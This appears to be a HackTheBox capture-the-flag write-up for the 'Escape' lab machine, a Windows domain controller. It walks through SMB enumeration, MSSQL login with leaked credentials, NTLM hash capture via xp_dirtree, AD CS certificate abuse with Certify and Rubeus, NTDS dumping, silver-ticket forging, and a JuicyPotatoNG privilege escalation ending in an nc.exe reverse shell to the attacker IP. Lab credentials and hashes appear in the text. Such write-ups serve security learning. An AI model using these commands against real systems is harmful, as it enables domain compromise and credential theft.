# HackTheBox - Escape

## NMAP

```bash
Nmap scan report for 10.10.11.202                                                                                                                                                                                       
Host is up (0.26s latency).                      
Not shown: 65515 filtered tcp ports (no-response)                                                               
PORT      STATE SERVICE       VERSION                                                                           
53/tcp    open  domain        Simple DNS Plus                                                                   
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-26 22:30:28Z)                                                                                                                                     
135/tcp   open  msrpc         Microsoft Windows RPC                                                             
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-02-26T22:32:01+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA             
| Public Key type: rsa                 
| Public Key bits: 2048                     
| Signature Algorithm: sha256WithRSAEncryption                                                                  
| Not valid before: 2022-11-18T21:20:35                                                                         
| Not valid after:  2023-11-18T21:20:35                                                                                                                                                                                          
| MD5:   869f7f54b2edff74708d1a6ddf34b9bd                                                                       
|_SHA-1: 742ab4522191331767395039db9b3b2e27b6f7fa
445/tcp   open  microsoft-ds?                                                                                   
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-02-26T22:32:00+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-18T21:20:35
| Not valid after:  2023-11-18T21:20:35
| MD5:   869f7f54b2edff74708d1a6ddf34b9bd
|_SHA-1: 742ab4522191331767395039db9b3b2e27b6f7fa
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback 
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-02-26T03:01:12
| Not valid after:  2053-02-26T03:01:12
| MD5:   21884a6bf954052953ea17d7d48ef578
|_SHA-1: a5c4b21438d9864636d0923db5bc3785598f6364
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-02-26T22:32:01+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-18T21:20:35
| Not valid after:  2023-11-18T21:20:35
| MD5:   869f7f54b2edff74708d1a6ddf34b9bd
|_SHA-1: 742ab4522191331767395039db9b3b2e27b6f7fa
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-02-26T22:32:00+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-18T21:20:35
| Not valid after:  2023-11-18T21:20:35
| MD5:   869f7f54b2edff74708d1a6ddf34b9bd
|_SHA-1: 742ab4522191331767395039db9b3b2e27b6f7fa
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
```

Adding the FQDN in `/etc/hosts` file 

<img src="https://i.imgur.com/XyqaPH4.png"/>

## PORT 139/445 (SMB)

Checking for null authentication of smb we do see some shares

<img src="https://i.imgur.com/3qAQ5MH.png"/>

From `Public` share we see a pdf document

<img src="https://i.imgur.com/QNv27ZF.png"/>

<img src="https://i.imgur.com/sq17EGX.png"/>

On the first page of the document it talks about accessing SQL Server with a non domain joined machine also it reveals three potential usernames `Tom`, `Brandon` and `Ryan`

<img src="https://i.imgur.com/DeiTtbU.png"/>

On the next page we'll see the credentials 

<img src="https://i.imgur.com/5D5Zqdy.png"/>

## Foothold

We can just try using impacket's mssqclient to login into the database using the provided credentials

```bash
mssqlclient.py PublicUser:GuestUserCantWrite1@sequel.htb
```

<img src="https://i.imgur.com/wD6huLP.png"/>

Trying to enable `xp_cmdshell` but it failed

<img src="https://i.imgur.com/yLRCEWO.png"/>

With `xp_dirtree` we can capture the NTLMv2 hash of the account with which the mssql service is running

```bash
xp_dirtree \\10.10.14.70\uwu
```

<img src="https://i.imgur.com/4XDqj6q.png"/>

With `hashcat` we can crack the hash with the password `REGGIE1234ronnie`

<img src="https://i.imgur.com/amn6Vet.png"/>

With this password we can enumerate to get domain users

<img src="https://i.imgur.com/EVJWLoB.png"/>

However logging with the service account, it failed

<img src="https://i.imgur.com/Gslo2Nm.png"/>

Running bloodhound to enumerate the domain

```bash
python3 /opt/BloodHound.py/bloodhound.py -d 'sequel.htb' -u 'sql_svc' -p 'REGGIE1234ronnie' -c all -ns 10.10.11.202
```

<img src="https://i.imgur.com/TNnNQiR.png"/>

From bloodhound we can see this user has `CanPsRemote` on dc which means we can login through winrm

<img src="https://i.imgur.com/Hy5MHOO.png"/>

```bash
evil-winrm -i sequel.htb -u 'sql_svc' -p 'REGGIE1234ronnie'
```

<img src="https://i.imgur.com/eqx3BjL.png"/>

## Privilege Escalation (Ryan.Cooper)

Checking `C:\SQLServer\Logs\ERRORLOG.BAK`, we'll find the password for `Ryan.Cooper`

<img src="https://i.imgur.com/fNreNAD.png"/>

## Privilege Escalation (Administrator)

After logging using `Certify` to check vulnerable certificate template, this can be downloaded from here 

https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/dotnet%20v4.5%20compiled%20binaries/Certify.exe

<img src="https://i.imgur.com/X5BqA5v.png"/>

<img src="https://i.imgur.com/p1AM215.png"/>

```bash
./Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
```

<img src="https://i.imgur.com/59cYbby.png"/>

Copy the certificate in a file `cert.pem`

<img src="https://i.imgur.com/ilJA8NZ.png"/>

Convert it to `cert.pfx`

<img src="https://i.imgur.com/ITylO6n.png"/>

Transfer it back to the windows machine and also transfer Rubues to get TGT of administrator

<img src="https://i.imgur.com/VJvtHgr.png"/>

Conveting the kirbi ticket to ccache

<img src="https://i.imgur.com/WhgPXzG.png"/>

Running `secretsdump.py` to dump NTDS 

<img src="https://i.imgur.com/EFBU1S7.png"/>

<img src="https://i.imgur.com/fIS8OgK.png"/>

## Un-inteded 

As sql_svc was not able to login mssql, we can try forging a silver ticket to impersonate as the administrator on mssq, we need the ntlm hash of the sql_svc and the domain sid

```python
import hashlib,binascii
hash = hashlib.new('md4', "REGGIE1234ronnie".encode('utf-16le')).digest();
print (binascii.hexlify(hash));
```

<img src="https://i.imgur.com/gMvf02K.png"/>

Through `rpcclient` , we can get the domain sid

<img src="https://i.imgur.com/fZLVmos.png"/>

With `ticketer.py` we can create the silver ticket

```bash
ticketer.py -nthash 1443ec19da4dac4ffc953bca1b57b4cf -spn MSSQLSvc/dc.sequel.htb -domain sequel.htb -domain-sid S-1-5-21-4078382237-1492182817-2568127209 administrator
```

<img src="https://i.imgur.com/EHCxKeb.png"/>

Before running `mssqlclient` , make sure to synchronize the time zone with `ntpdate`

```bash
mssqlclient.py dc.sequel.htb -k -no-pass
sudo ntpdate dc.sequel.htb
```

<img src="https://i.imgur.com/fSa3fe7.png"/>

<img src="https://i.imgur.com/ZKkMRF1.png"/>

Now we can enable `xp_cmdshell` and get a reverse shell

<img src="https://i.imgur.com/uKyTIkS.png"/>

<img src="https://i.imgur.com/GCSNy40.png"/>

Transfer nc.exe and get a reverse shell

<img src="https://i.imgur.com/gfTdKgp.png"/>

<img src="https://i.imgur.com/ptKqh68.png"/>

If we check running `whoami /all`, it will show that there's `SeImpersonatePrivilege` enabled meaning that we can abuse that to get a SYSTEM token and eventually get a system shell

<img src="https://i.imgur.com/XSthGOl.png"/>

With `JuicyPotato-NG`, we can get a reverse shell as SYSTEM

```powershell
JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c C:\Windows\Temp\nc.exe 10.10.14.70 80 -e cmd.exe"
```


<img src="https://i.imgur.com/9pXxoI1.png"/>

## References

- https://www.thehacker.recipes/ad/movement/ad-cs
- https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/dotnet%20v4.5%20compiled%20binaries/Certify.exe
